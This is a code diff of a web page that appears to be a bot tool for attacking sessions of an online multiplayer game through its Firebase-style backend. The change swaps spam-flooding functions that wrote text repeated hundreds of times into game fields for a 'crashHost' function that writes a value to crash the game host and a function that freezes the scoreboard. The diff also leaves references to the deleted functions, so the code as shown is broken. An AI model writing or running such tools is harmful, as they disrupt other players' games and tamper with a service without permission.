@@ -178,26 +178,30 @@
             }
         }
 
-        // ✅ Send Ad Text
-        async function sendAdText() {
+        // ✅ Crash Host
+        async function crashHost(button) {
             if (!db) return log("❌ Bot not connected");
-            const adText = prompt("Enter the text you want to send:");
-            if (!adText || adText.includes(":")) return log("❌ Invalid text input");
-            await set(ref(db, `${gameId}/c/${botName}/b`), `Dog:${adText.repeat(500)}`);
-            log(`📢 Ad text sent: ${adText}`);
+            await set(ref(db, `${gameId}/c/${botName}/g/t`), "t");
+            button.innerText = "Crashing...";
+            log("🔥 Crashing host...");
         }
 
-        // ✅ Flood Alert Box
-        async function floodAlertBox() {
+        // ✅ Freeze/Unfreeze Scoreboard
+        async function freezeScoreboard(button) {
             if (!db) return log("❌ Bot not connected");
-            const spamText = prompt("Enter flood text:");
-            if (!spamText) return;
-            await set(ref(db, `${gameId}/c/${botName}/tat`), `${botName}:${Date.now()}${spamText.repeat(1700)}`);
-            log("🌊 Alert box flooded");
+            isScoreboardFrozen = !isScoreboardFrozen;
+            await set(ref(db, `${gameId}/tat/t`), isScoreboardFrozen ? "t" : "f");
+            button.innerText = isScoreboardFrozen ? "Unfreeze Scoreboard" : "Freeze Scoreboard";
+            log(`❄️ Scoreboard ${isScoreboardFrozen ? "frozen" : "unfrozen"}`);
         }
 
+        // ✅ Make All Functions Global
+        window.joinBot = joinBot;
+        window.crashHost = crashHost;
+        window.freezeScoreboard = freezeScoreboard;
         window.sendAdText = sendAdText;
         window.floodAlertBox = floodAlertBox;
+        window.leaveGame = () => log("🚪 Left the game.");
     </script>
 </body>
 </html>
